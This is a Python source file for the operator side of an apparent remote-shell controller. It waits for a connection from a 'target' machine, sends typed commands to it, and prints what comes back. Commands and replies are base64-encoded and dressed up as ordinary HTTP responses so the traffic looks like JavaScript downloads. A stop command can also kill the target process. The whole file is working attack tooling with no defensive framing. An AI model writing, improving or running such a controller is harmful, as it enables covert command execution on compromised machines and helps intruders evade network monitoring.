# -*- coding: utf-8 -*-
import base64
import socket
import argparse
import time

def connection(s):
    print('Waiting for connection......')
    ss, addr = s.accept()
    print('client %s is connection!' % (addr[0]))
    print('print:\\!q for Disconnect  and  print:\\!shutdown for Kill the target process')
    while True:
        cmd = input(str(addr[0]) + ':#')
        if cmd == '\\!q':
            print('-- Disconnected --')
            exit(0)
        elif cmd == '\\!shutdown':
            print('Are you sure you\'re killing the target process? (Y/N)')
            tmp_cmd = input('>')
            if tmp_cmd.upper() == 'Y':
                print("Terminated target process.\r\n已终止目标进程。")
            else:
                continue
        ss.send(encryption_res(cmd.encode()))
        data = ss.recv(4096)
        print(decryption_req(data).decode(), end='')

def encryption_res(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()
    # 对时间进行处理
    date = time.strftime('%a, %d %b %Y %X GMT', time.localtime(time.time()))

    sendData = "HTTP/1.1 200 OK"
    sendData += "\r\n"
    sendData += "Date: %s" % date
    sendData += "\r\n"
    sendData += "Content-Type: application/x-javascript"
    sendData += "\r\n"
    sendData += "Content-Length: %d" % len(data)
    sendData += "\r\n"
    sendData += "Connection: keep-alive"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "%s" % data
    return sendData.encode()

def decryption_req(data):
    data = data.decode()
    data = data[data.find("\r\n\r\nstri0date=") + 14:]
    data = data[:data.find("\r\n\r\n")]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='hostName', default='0.0.0.0', help='Host Name(default=0.0.0.0)')
    parser.add_argument('-port', dest='conPort', default=1234, help='Host Port(default=1234)')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host,port))
    s.listen(512)
    connection(s)

